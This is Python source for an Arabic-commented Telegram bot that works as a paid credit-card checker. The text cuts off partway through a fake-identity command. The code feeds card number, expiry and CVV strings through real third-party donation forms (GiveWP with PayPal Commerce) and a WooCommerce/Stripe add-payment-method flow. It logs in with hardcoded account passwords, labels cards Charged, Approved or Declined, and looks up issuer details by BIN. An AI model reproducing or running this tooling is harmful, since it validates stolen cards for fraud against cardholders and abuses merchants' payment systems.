import telebot, os, re, json, requests, time, random, string, threading, queue
from telebot import types
from datetime import datetime, timedelta
from faker import Faker
from multiprocessing import Process
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from requests_toolbelt import MultipartEncoder
import base64

# ================= [ الإعدادات ] =================
CHANNEL_USERNAME = "@ankabot6"
# تأكد أن اسم المتغير في Railway هو BOT_TOKEN
TOKEN = os.environ.get("BOT_TOKEN")

if not TOKEN:
    print("خطأ: يرجى ضبط متغير BOT_TOKEN في إعدادات Railway!")
    exit(1)

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
admin = 8011795436
# ... (باقي الثوابت E_001 إلى E_020 كما هي في كودك القديم)
E_001 = "4956222745814762495"
E_002 = "5945194134573685106"
E_003 = "5945183830947142048"
E_004 = "5945125479521458519"
E_005 = "5943007373449763836"
E_006 = "5944855107035209527"
E_007 = "5956409844666738131"
E_008 = "5956097759458106083"
E_009 = "5944794487866791656"
E_010 = "5945161424102759585"
E_011 = "5945263167583033922"
E_012 = "5945223615229204284"
E_013 = "5944785030348807288"
E_014 = "5944896244231968531"
E_015 = "5947299570491856688"
E_016 = "5947177498931369799"
E_017 = "5947500493356931114"
E_018 = "5945008295633754676"
E_019 = "5944769654365886542"
E_020 = "5945168588108209063"

E_FIRE = E_001
E_DIAMOND = E_002
E_CROSS = E_003
E_CLOCK = E_004
E_CARD = E_005
E_BOT = E_006
E_CHECK = E_007
E_STAR = E_008
E_CROWN = E_009
E_LOCK = E_010
E_BOLT = E_011
E_SHIELD = E_012
E_GLOBE = E_013
E_KEY = E_014
E_WARN = E_015
E_STOP = E_016
E_ADD = E_017
E_LIST = E_018
E_MANUAL = E_019

def tge(emoji_id, fallback="⚡"):
    return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'

CHARGED_KEYWORDS = ['Charged', 'CHARGE', 'Charge', 'charged', 'sucsess', 'true', 'Success']
APPROVED_KEYWORDS = ['INSUFFICIENT_FUNDS', 'INSUFFICIENT FUNDS', 'Payment method', 'insufficient_funds', 'insufficient funds', 'success']
CCN_KEYWORDS = []
DECLINED_KEYWORDS = ['ORDER_NOT_APPROVED', 'DECLINED', 'Declined', 'declined', 'DENIED', 'denied', 'REJECTED', 'rejected', 'Your card was declined', 'card_declined', 'do_not_honor', 'DO_NOT_HONOR', 'generic_decline', 'GENERIC_DECLINE', 'lost_card', 'stolen_card', 'expired_card', 'pickup_card', 'restricted_card', 'transaction_not_allowed', 'TRANSACTION_NOT_ALLOWED', 'security code is incorrect', 'CVV2_FAILURE', 'CVV2', 'CVC_FAILURE', 'cvv', 'Cvv', 'incorrect security code']

_L = '[<a href="https://t.me/rivatry_bot">ϟ</a>]'

GATES_FILE = "gates.json"
CONFIG_FILE = "config.json"

gate_round_robin_index = 0
gate_round_robin_lock = threading.Lock()

# دالة التحقق من الاشتراك الإجباري
def check_subscription(bot, message):
    user_id = message.from_user.id
    # لو كان الآدمن شغال، بنعديه علطول مش لازم يشترك
    if user_id == admin:
        return True
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        if member.status in ['creator', 'administrator', 'member']:
            return True
        else:
            raise Exception("Not subscribed")
    except Exception:
        # تنسيق رابط الاشتراك
        clean_username = CHANNEL_USERNAME.replace("@", "")
        markup = types.InlineKeyboardMarkup()
        btn_link = types.InlineKeyboardButton(text="اضغط هنا للاشتراك في القناة 📢", url=f"https://t.me/{clean_username}")
        markup.add(btn_link)
        
        bot.reply_to(
            message, 
            f"⚠️ **عذراً يا صاحبي! البوت مقفول للمشتركين فقط.**\n\nيجب عليك الاشتراك في قناتنا أولاً لتتمكن من استخدام البوت ومميزاته، اشترك وفك الحظر عن البوت!",
            reply_markup=markup,
            parse_mode="Markdown"
        )
        return False

def load_gates():
    try:
        with open(GATES_FILE, 'r') as f:
            return json.load(f)
    except:
        default = {}
        save_gates(default)
        return default

def save_gates(gates):
    with open(GATES_FILE, 'w') as f:
        json.dump(gates, f, ensure_ascii=False, indent=4)

def get_next_paypal_gate():
    global gate_round_robin_index
    gates = load_gates()
    paypal_gates = [(k, g) for k, g in gates.items() if g.get('type') == 'paypal' and g.get('url', '').strip()]
    if not paypal_gates:
        return "", "PayPal_Charge"
    with gate_round_robin_lock:
        idx = gate_round_robin_index % len(paypal_gates)
        gate_round_robin_index += 1
    key, gate = paypal_gates[idx]
    return gate['url'].strip(), gate.get('name', 'PayPal_Charge')

def load_config():
    try:
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    except:
        default = {"gate_price": "0.50"}
        save_config(default)
        return default

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f)

def initialize_data_file():
    if not os.path.exists('data.json'):
        default_data = {}
        with open('data.json', 'w') as f:
            json.dump(default_data, f, ensure_ascii=False, indent=4)

def get_user_points(user_id):
    try:
        with open('data.json', 'r') as f:
            data = json.load(f)
        return data.get(str(user_id), {}).get('points', 0)
    except:
        return 0

def add_user_points(user_id, amount):
    try:
        with open('data.json', 'r') as f:
            data = json.load(f)
    except:
        data = {}
    if str(user_id) not in data:
        data[str(user_id)] = {'points': 0}
    current = data[str(user_id)].get('points', 0)
    data[str(user_id)]['points'] = current + amount
    with open('data.json', 'w') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    return data[str(user_id)]['points']

def deduct_user_points(user_id, amount):
    try:
        with open('data.json', 'r') as f:
            data = json.load(f)
    except:
        return False
    if str(user_id) not in data:
        return False
    current = data[str(user_id)].get('points', 0)
    if current < amount:
        return False
    data[str(user_id)]['points'] = current - amount
    with open('data.json', 'w') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    return True

class PayPalGateway:
    
    gateway_counter = 0
    _requests_session = None
    
    def __init__(self):
        if PayPalGateway._requests_session is None:
            PayPalGateway._requests_session = requests.Session()
            PayPalGateway._requests_session.verify = False
            from requests.adapters import HTTPAdapter
            adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50)
            PayPalGateway._requests_session.mount("https://", adapter)
        self.session = PayPalGateway._requests_session
    
    def get_next_gateway(self):
        gates = load_gates()
        paypal_gates = []
        for key, gate in gates.items():
            if gate.get('type') == 'paypal' and gate.get('url', '').strip():
                paypal_gates.append({
                    'name': gate.get('name', key),
                    'url': gate.get('url', '').strip()
                })
        if not paypal_gates:
            return None
        gateway = paypal_gates[PayPalGateway.gateway_counter % len(paypal_gates)]
        PayPalGateway.gateway_counter += 1
        return gateway
    
    def process(self, card_data, amount='0.50'):
        gateway_index = 0
        gateway_name = 'Unknown'
        try:
            parts = card_data.strip().replace(' ', '|').replace(':', '|').split('|')
            if len(parts) < 4:
                return f"INVALID_FORMAT|{gateway_index}|{gateway_name}"
            
            n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
            
            if len(yy) == 4 and yy.startswith('20'):
                yy = yy[2:]
            if len(mm) == 1:
                mm = '0' + mm
            
            gw = self.get_next_gateway()
            if not gw:
                return f"NO_GATEWAYS_AVAILABLE|0|NoGateways"
            
            gateway_name = gw['name']
            gateway_url = gw['url']
            
            from urllib.parse import urlparse
            parsed_url = urlparse(gateway_url)
            authority = parsed_url.netloc
            origin = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard"]
            last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Miller", "Davis"]
            first_name = random.choice(first_names)
            last_name = random.choice(last_names)
            email = f"{first_name.lower()}{last_name.lower()}{random.randint(100, 999)}@gmail.com"
            
            headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36'}
            
            try:
                response = self.session.get(gateway_url, headers=headers, timeout=8)
            except:
                return f"CONNECTION_ERROR|{gateway_index}|{gateway_name}"
            
            c_match = re.search(r'name="give-form-hash" value="(.*?)"', response.text)
            x_match = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text)
            v_match = re.search(r'name="give-form-id" value="(.*?)"', response.text)
            
            if not c_match or not x_match or not v_match:
                return f"EXTRACT_ERROR|{gateway_index}|{gateway_name}"
            
            c = c_match.group(1)
            x = x_match.group(1)
            v = v_match.group(1)
            
            form_title = re.search(r'name="give-form-title" value="(.*?)"', response.text)
            form_title = form_title.group(1) if form_title else 'Donation Form'
            
            enc_match = re.search(r'"data-client-token":"(.*?)"', response.text)
            if not enc_match:
                return f"TOKEN_EXTRACT_ERROR|{gateway_index}|{gateway_name}"
            
            enc = enc_match.group(1)
            
            try:
                au_match = re.search(r'"accessToken":"(.*?)"', base64.b64decode(enc).decode('utf-8'))
                if not au_match:
                    return f"ACCESS_TOKEN_ERROR|{gateway_index}|{gateway_name}"
                au = au_match.group(1)
            except:
                return f"DECODE_ERROR|{gateway_index}|{gateway_name}"
            
            multipart_data = MultipartEncoder({
                'give-honeypot': (None, ''),
                'give-form-id-prefix': (None, x),
                'give-form-id': (None, v),
                'give-form-title': (None, form_title),
                'give-current-url': (None, gateway_url),
                'give-form-url': (None, gateway_url),
                'give-form-minimum': (None, '0.01'),
                'give-form-maximum': (None, '999999.99'),
                'give-form-hash': (None, c),
                'give-price-id': (None, '0'),
                'give-amount': (None, amount),
                'give_first': (None, first_name),
                'give_last': (None, last_name),
                'give_email': (None, email),
                'give_comment': (None, ''),
                'payment-mode': (None, 'paypal-commerce'),
                'card_name': (None, f'{first_name} {last_name}'),
                'billing_country': (None, 'US'),
                'card_address': (None, '123 Main Street'),
                'card_city': (None, 'New York'),
                'card_state': (None, 'NY'),
                'card_zip': (None, '10001'),
                'give-gateway': (None, 'paypal-commerce'),
                'give_embed_form': (None, '1'),
            })
            
            ajax_url = f"{origin}/wp-admin/admin-ajax.php"
            
            headers = {
                'authority': authority,
                'accept': '*/*',
                'content-type': multipart_data.content_type,
                'origin': origin,
                'referer': gateway_url,
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
            }
            
            try:
                response = self.session.post(
                    ajax_url,
                    params={'action': 'give_paypal_commerce_create_order'},
                    headers=headers,
                    data=multipart_data,
                    timeout=8
                )
                order_id = response.json()['data']['id']
            except:
                return f"ORDER_CREATE_ERROR|{gateway_index}|{gateway_name}"
            
            headers = {
                'authority': 'cors.api.paypal.com',
                'accept': '*/*',
                'authorization': f'Bearer {au}',
                'braintree-sdk-version': '3.32.0-payments-sdk-dev',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'referer': 'https://assets.braintreegateway.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            }
            
            json_data = {
                'payment_source': {
                    'card': {
                        'number': n,
                        'expiry': f'20{yy}-{mm}',
                        'security_code': cvc,
                        'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                    },
                },
                'application_context': {'vault': False},
            }
            
            try:
                self.session.post(
                    f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
                    headers=headers,
                    json=json_data,
                    timeout=8
                )
            except:
                pass
            
            multipart_data2 = MultipartEncoder({
                'give-honeypot': (None, ''),
                'give-form-id-prefix': (None, x),
                'give-form-id': (None, v),
                'give-form-title': (None, form_title),
                'give-current-url': (None, gateway_url),
                'give-form-url': (None, gateway_url),
                'give-form-minimum': (None, '0.01'),
                'give-form-maximum': (None, '999999.99'),
                'give-form-hash': (None, c),
                'give-price-id': (None, '0'),
                'give-amount': (None, amount),
                'give_first': (None, first_name),
                'give_last': (None, last_name),
                'give_email': (None, email),
                'give_comment': (None, ''),
                'payment-mode': (None, 'paypal-commerce'),
                'card_name': (None, f'{first_name} {last_name}'),
                'billing_country': (None, 'US'),
                'card_address': (None, '123 Main Street'),
                'card_city': (None, 'New York'),
                'card_state': (None, 'NY'),
                'card_zip': (None, '10001'),
                'give-gateway': (None, 'paypal-commerce'),
                'give_embed_form': (None, '1'),
            })
            
            headers = {
                'authority': authority,
                'accept': '*/*',
                'content-type': multipart_data2.content_type,
                'origin': origin,
                'referer': gateway_url,
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
            }
            
            try:
                response = self.session.post(
                    ajax_url,
                    params={'action': 'give_paypal_commerce_approve_order', 'order': order_id},
                    headers=headers,
                    data=multipart_data2,
                    timeout=8
                )
                text = response.text
            except:
                return f"FINAL_REQUEST_ERROR|{gateway_index}|{gateway_name}"
            
            if 'true' in text and 'success":true' in text:
                return f"Charged {amount} 🔥|{gateway_index}|{gateway_name}"
            elif 'INSUFFICIENT_FUNDS' in text:
                return f"INSUFFICIENT_FUNDS|{gateway_index}|{gateway_name}"
            else:
                resp_upper = text.upper()
                for keyword in DECLINED_KEYWORDS:
                    if keyword.upper() in resp_upper:
                        return f"{keyword.upper()}|{gateway_index}|{gateway_name}"
                return f"DECLINED|{gateway_index}|{gateway_name}"
            
        except requests.exceptions.Timeout:
            return f"TIMEOUT_ERROR|{gateway_index}|{gateway_name}"
        except requests.exceptions.ConnectionError:
            return f"CONNECTION_ERROR|{gateway_index}|{gateway_name}"
        except Exception as e:
            error_msg = str(e)[:40]
            return f"ERROR: {error_msg}|{gateway_index}|{gateway_name}"

paypal_gateway = PayPalGateway()

VBV_API_URL = "http://72.62.16.52:8000/check"

def vbv_checker(card_data):
    """Check if a card requires 3D Secure (VBV/MCSC) using external API."""
    result = {
        'status': 'UNKNOWN',
        'enrolled': None,
        'response': '',
        'gateway': '3DS_Lookup',
        'error': None
    }
    try:
        parts = card_data.strip().replace(' ', '|').replace(':', '|').split('|')
        if len(parts) < 4:
            result['status'] = 'INVALID_FORMAT'
            result['error'] = 'Invalid card format'
            return result
        
        cc, mm, yy, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
        data_str = f"{cc}|{mm}|{yy}|{cvv}"
        
        r = requests.get(VBV_API_URL, params={"data": data_str, "mode": "3ds"}, timeout=120)
        api_result = r.json()
        
        status = api_result.get("status", "Error")
        response = api_result.get("response", "")
        
        if status == "Passed":
            result['status'] = 'NOT_ENROLLED'
            result['enrolled'] = False
            result['response'] = '3D-Authentication successful'
        elif status == "OTP":
            result['status'] = 'VBV_ENROLLED'
            result['enrolled'] = True
            result['response'] = '3DS OTP Required'
        elif status == "Declined":
            result['status'] = 'DECLINED'
            result['enrolled'] = None
            result['response'] = response if response else 'Declined'
        else:
            result['status'] = 'UNKNOWN'
            result['enrolled'] = None
            result['response'] = response if response else status
        
        return result
        
    except requests.exceptions.Timeout:
        result['status'] = 'TIMEOUT'
        result['error'] = 'Request timed out'
        return result
    except requests.exceptions.ConnectionError:
        result['status'] = 'CONNECTION_ERROR'
        result['error'] = 'Connection failed'
        return result
    except Exception as e:
        result['status'] = 'ERROR'
        result['error'] = str(e)[:60]
        return result

def stripe_checker(ccx, email_account=None):
    ccx = ccx.strip()
    parts = ccx.split("|")
    if len(parts) < 4:
        return "INVALID_FORMAT"
    n = parts[0]
    mm = parts[1]
    yy = parts[2]
    cvc = parts[3]
    if "20" in yy:
        yy = yy.split("20")[1]
    session = requests.Session()
    base_url = "https://hollywood-video.it"
    
    add_payment_url = f"{base_url}/my-account/add-payment-method/"
    headers = {
        'authority': 'www.tacugama.com',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    try:
        resp = session.get(add_payment_url, headers=headers, timeout=15)
        if resp.status_code != 200:
            return "HTTP_ERROR"
        reg_nonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', resp.text)
        if not reg_nonce:
            return "NONCE_NOT_FOUND"
        reg_nonce = reg_nonce.group(1)
    except Exception as e:
        return f"CONNECTION_ERROR: {str(e)[:50]}"

    if email_account:
        my_email = email_account["email"]
        my_password = email_account["pass"]
    else:
        accounts = [
            {"email": "nmn45746@gmail.com", "pass": "Amr01143052861"},
            {"email": "moraki9322@veospot.com", "pass": "Amr01143052861"},
            {"email": "tejim42701@veospot.com", "pass": "Amr01143052861"},
            {"email": "widinej121@woraco.com", "pass": "Amr01143052861"},
            {"email": "xikoj52187@woraco.com", "pass": "Amr01143052861"},
            {"email": "gololig100@woraco.com", "pass": "Amr01143052861"}
        ]
        selected_account = random.choice(accounts)
        my_email = selected_account["email"]
        my_password = selected_account["pass"]

    login_nonce_match = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', resp.text)
    login_nonce = login_nonce_match.group(1) if login_nonce_match else ""

    data = {
        'username': my_email,
        'password': my_password,
        'woocommerce-login-nonce': login_nonce,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'login': 'Login',
    }
    try:
        resp = session.post(add_payment_url, headers=headers, data=data, allow_redirects=True, timeout=15)
    except Exception as e:
        return f"REGISTER_ERROR: {str(e)[:50]}"
    try:
        resp = session.get(add_payment_url, headers=headers, timeout=15)
        pk_match = re.search(r'(pk_live_[a-zA-Z0-9]+)', resp.text)
        if not pk_match:
            return "PK_LIVE_NOT_FOUND"
        pk_live = pk_match.group(1)
        addnonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', resp.text)
        if not addnonce_match:
            return "ADDNONCE_NOT_FOUND"
        addnonce = addnonce_match.group(1)
    except Exception as e:
        return f"EXTRACT_ERROR: {str(e)[:50]}"
    stripe_headers = {
        'authority': 'api.stripe.com',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    stripe_data = (
        f"type=card&card[number]={n}&card[cvc]={cvc}"
        f"&card[exp_year]={yy}&card[exp_month]={mm}"
        f"&allow_redisplay=unspecified"
        f"&billing_details[address][postal_code]=10090"
        f"&billing_details[address][country]=US"
        f"&payment_user_agent=stripe.js%2Ffd4fde14f8%3B+stripe-js-v3%2Ffd4fde14f8%3B+payment-element%3B+deferred-intent"
        f"&key={pk_live}"
    )
    try:
        resp = session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, timeout=15)
        if resp.status_code != 200:
            return f"STRIPE_ERROR_{resp.status_code}"
        payment_id = resp.json().get('id')
        if not payment_id:
            return "PAYMENT_ID_NOT_FOUND"
    except Exception as e:
        return f"STRIPE_CONN_ERROR: {str(e)[:50]}"
    ajax_headers = {
        'authority': 'www.tacugama.com',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    ajax_data = {
        'action': 'wc_stripe_create_and_confirm_setup_intent',
        'wc-stripe-payment-method': payment_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': addnonce,
    }
    try:
        admin_ajax_url = f"{base_url}/wp-admin/admin-ajax.php"
        resp = session.post(admin_ajax_url, headers=ajax_headers, data=ajax_data, timeout=15)
        text = resp.text
        if 'Your card was declined' in text or 'Your card could not be set up' in text:
            return "Your card was declined"
        elif 'success":true' in text or 'succeeded' in text:
            return "Payment method"
        else:
            try:
                j = resp.json()
                if 'data' in j and 'error' in j['data']:
                    msg = j['data']['error'].get('message', 'UNKNOWN')
                    return msg
            except:
                pass
            return text[:100] if text else "UNKNOWN_RESPONSE"
    except Exception as e:
        return f"AJAX_ERROR: {str(e)[:50]}"

def reg(cc):
    try:
        patterns = [
            r'(\d{16})[|/ ](\d{1,2})[|/ ](\d{2,4})[|/ ](\d{3,4})',
            r'(\d{15})[|/ ](\d{1,2})[|/ ](\d{2,4})[|/ ](\d{3,4})',
            r'(\d{16})[|/ ](\d{1,2})[|/ ](\d{2,4})',
            r'(\d{15})[|/ ](\d{1,2})[|/ ](\d{2,4})'
        ]
        for pattern in patterns:
            match = re.search(pattern, cc)
            if match:
                card = match.group(1)
                month = match.group(2).zfill(2)
                year = match.group(3)
                if len(year) == 2:
                    year = '20' + year
                if len(match.groups()) >= 4:
                    cvv = match.group(4)
                else:
                    cvv = str(random.randint(0, 999)).zfill(3)
                return f"{card}|{month}|{year}|{cvv}"
        return None
    except:
        return None

stopuser = {}

token = os.getenv("BOT_TOKEN") 
bot = telebot.TeleBot(token, parse_mode="HTML")
admin = 8011795436
active_scans = set()
command_usage = {}
admin_add_gate_state = {}

def dato(zh):
    try:
        api_url = requests.get("https://bins.antipublic.cc/bins/" + zh).json()
        brand = api_url["brand"]
        card_type = api_url["type"]
        level = api_url["level"]
        bank = api_url["bank"]
        country_name = api_url["country_name"]
        country_flag = api_url["country_flag"]
        return {
            "brand": brand,
            "type": card_type,
            "level": level,
            "bank": bank,
            "country_name": country_name,
            "country_flag": country_flag
        }
    except Exception as e:
        print(e)
        return {"brand": "N/A", "type": "N/A", "level": "N/A", "bank": "N/A", "country_name": "N/A", "country_flag": "N/A"}

def send_not_subscribed(chat_id, name):
    keyboard = types.InlineKeyboardMarkup()
    contact_button = types.InlineKeyboardButton(
        text="😈 عنكبوت 😈",
        url="https://t.me/ankabot6",
        icon_custom_emoji_id=E_CROWN
    )
    keyboard.add(contact_button)
    msg_text = f"اهلا بك عزيزي >> {name}\nالبوت مدفوع وليس مجاني : @z_0_y2  "
    bot.send_message(chat_id=chat_id, text=msg_text, reply_markup=keyboard)

def classify_response(raw_response):
    resp = str(raw_response)
    if any(kw in resp for kw in CHARGED_KEYWORDS):
        return 'charged'
    elif any(kw in resp for kw in APPROVED_KEYWORDS):
        return 'approved'
    elif any(kw in resp for kw in CCN_KEYWORDS):
        return 'ccn'
    else:
        return 'declined'

def format_check_msg(card, category, result, bin_info, elapsed, user_name, gate_name, amount):
    if isinstance(bin_info, str):
        bin_info = {"brand": "N/A", "type": "N/A", "level": "N/A", "bank": "N/A", "country_name": "N/A", "country_flag": ""}
    card_brand = bin_info.get('brand', '').upper()
    if 'VISA' in card_brand:
        brand_emoji = tge("5281007837730841762", "💳")
        brand_emoji_fb = '💳'
    elif 'MASTERCARD' in card_brand or 'MASTER' in card_brand:
        brand_emoji = tge("5278219081105811309", "💳")
        brand_emoji_fb = '💳'
    else:
        brand_emoji = tge("4956233646441760046", "🌊")
        brand_emoji_fb = '💰'
    if category == 'charged':
        status_text = "Charged 🔥"
        response_text = f"Charged {amount} {tge(E_FIRE, '🔥')}"
        response_text_fb = f"Charged {amount} 🔥"
    elif category == 'approved':
        status_text = " ✅ Approved"
        response_text = f"✅ {result}"
        response_text_fb = f"✅ {result}"
    elif category == 'ccn':
        status_text = "CCN"
        response_text = f"☑️ {result}"
        response_text_fb = f"☑️ {result}"
    else:
        status_text = "Declined"
        response_text = f"❌ {result}"
        response_text_fb = f"❌ {result}"
    user_name_display = f"{user_name} {tge('5848338971326682635', '💪')}"
    user_name_display_fb = f"{user_name} 💪"
    
    if gate_name == "Stripe_Auth":
        gate_tag = "#Stripe_Auth"
        msg_premium = f"""{gate_tag} [/chk] {tge("5041994565565809886", "🌊")}
- - - - - - - - - - - - - - - - - - - - - - -
{_L} 𝐂𝐚𝐫𝐝: <code>{card}</code> {brand_emoji}
{_L} 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
{_L} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {response_text}
- - - - - - - - - - - - - - - - - - - - - - -
{_L} 𝐁𝐢𝐧: {bin_info.get('brand','N/A')} - {bin_info.get('type','N/A')} - {bin_info.get('level','N/A')}
{_L} 𝐁𝐚𝐧𝐤: {bin_info.get('bank','N/A')} - {bin_info.get('country_flag','')}
{_L} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info.get('country_name','N/A')} [ {bin_info.get('country_flag','')} ]
- - - - - - - - - - - - - - - - - - - - - - -
{_L} T/t : {elapsed:.2f}s | Proxy : Live {tge(E_STAR, "😈")}
[<a href="https://t.me/rivatry_bot">⌥</a>] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: {user_name_display}
[<a href="https://t.me/rivatry_bot">⌥</a>] 
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/z_0_y2">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: <a href="https://t.me/z_0_y2">عنكبوت</a> - {tge(E_CHECK, "🌟")}"""
        msg_fallback = f"""{gate_tag} [/chk] 🌊
- - - - - - - - - - - - - - - - - - - - - - -
{_L} 𝐂𝐚𝐫𝐝: <code>{card}</code> {brand_emoji_fb}
{_L} 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
{_L} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {response_text_fb}
- - - - - - - - - - - - - - - - - - - - - - -
{_L} 𝐁𝐢𝐧: {bin_info.get('brand','N/A')} - {bin_info.get('type','N/A')} - {bin_info.get('level','N/A')}
{_L} 𝐁𝐚𝐧𝐤: {bin_info.get('bank','N/A')} - {bin_info.get('country_flag','')}
{_L} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info.get('country_name','N/A')} [ {bin_info.get('country_flag','')} ]
- - - - - - - - - - - - - - - - - - - - - - -
{_L} T/t : {elapsed:.2f}s | Proxy : Live 😈
[<a href="https://t.me/rivatry_bot">⌥</a>] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: {user_name_display_fb}
[<a href="https://t.me/rivatry_bot">⌥</a>] 
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/z_0_y2">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: <a href="https://t.me/z_0_y2">عنكبوت</a> - 🌟"""
    else:
        gate_tag = "#PayPal_Charge"
        msg_premium = f"""{gate_tag} [/pp] {tge("5206665368336111207", "🌊")}
- - - - - - - - - - - - - - - - - - - - - - -
{_L} 𝐂𝐚𝐫𝐝: <code>{card}</code> {brand_emoji}
{_L} 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
{_L} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {response_text}
- - - - - - - - - - - - - - - - - - - - - - -
{_L} 𝐁𝐢𝐧: {bin_info.get('brand','N/A')} - {bin_info.get('type','N/A')} - {bin_info.get('level','N/A')}
{_L} 𝐁𝐚𝐧𝐤: {bin_info.get('bank','N/A')} - {bin_info.get('country_flag','')}
{_L} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info.get('country_name','N/A')} [ {bin_info.get('country_flag','')} ]
- - - - - - - - - - - - - - - - - - - - - - -
{_L} T/t : {elapsed:.2f}s | Proxy : Live {tge(E_STAR, "😈")}
[<a href="https://t.me/rivatry_bot">⌥</a>] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: {user_name_display}
[<a href="https://t.me/rivatry_bot">⌥</a>] 𝐆𝐚𝐭𝐞 𝐏𝐫𝐢𝐜𝐞: ${amount}
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/z_0_y2">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: <a href="https://t.me/z_0_y2">عنكبوت</a> - {tge(E_CHECK, "🌟")}"""
        msg_fallback = f"""{gate_tag} [/pp] 🌊
- - - - - - - - - - - - - - - - - - - - - - -
{_L} 𝐂𝐚𝐫𝐝: <code>{card}</code> {brand_emoji_fb}
{_L} 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
{_L} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {response_text_fb}
- - - - - - - - - - - - - - - - - - - - - - -
{_L} 𝐁𝐢𝐧: {bin_info.get('brand','N/A')} - {bin_info.get('type','N/A')} - {bin_info.get('level','N/A')}
{_L} 𝐁𝐚𝐧𝐤: {bin_info.get('bank','N/A')} - {bin_info.get('country_flag','')}
{_L} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info.get('country_name','N/A')} [ {bin_info.get('country_flag','')} ]
- - - - - - - - - - - - - - - - - - - - - - -
{_L} T/t : {elapsed:.2f}s | Proxy : Live 😈
[<a href="https://t.me/rivatry_bot">⌥</a>] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: {user_name_display_fb}
[<a href="https://t.me/rivatry_bot">⌥</a>] 𝐆𝐚𝐭𝐞 𝐏𝐫𝐢𝐜𝐞: ${amount}
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/z_0_y2">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: <a href="https://t.me/z_0_y2">عنكبوت</a> - 🌟"""
    return msg_premium, msg_fallback

def send_check_result(chat_id, message_id, card, category, result, bin_info, elapsed, user_name, gate_name, amount):
    msg_premium, msg_fallback = format_check_msg(card, category, result, bin_info, elapsed, user_name, gate_name, amount)
    try:
        bot.delete_message(chat_id, message_id)
    except:
        pass
    try:
        bot.send_message(chat_id=chat_id, text=msg_premium, parse_mode='HTML', disable_web_page_preview=False)
    except:
        try:
            bot.send_message(chat_id=chat_id, text=msg_fallback, parse_mode='HTML', disable_web_page_preview=False)
        except Exception as e:
            bot.send_message(chat_id=chat_id, text=f"خطأ في إرسال النتيجة: {str(e)[:100]}")

@bot.message_handler(commands=['fake'])
def generate_full_identity(message):
    if not check_subscription(bot, message): return # فحص الاشتراك
    try:
        cities_data = [
            {"city": "New York", "state": "NY", "zip": "10001"},
            {"city": "Los Angeles", "state": "CA", "zip": "90001"},
            {"city": "Chicago", "state": "IL", "zip": "60601"},
            {"city": "Houston", "state": "TX", "zip": "77001"},
            {"city": "Phoenix", "state": "AZ", "zip": "85001"},
            {"city": "Miami", "state": "FL", "zip": "33101"},
            {"city": "Seattle", "state": "WA", "zip": "98101"},
            {"city": "Denver", "state": "CO", "zip": "80201"},
            {"city": "Boston", "state": "MA", "zip": "02101"},
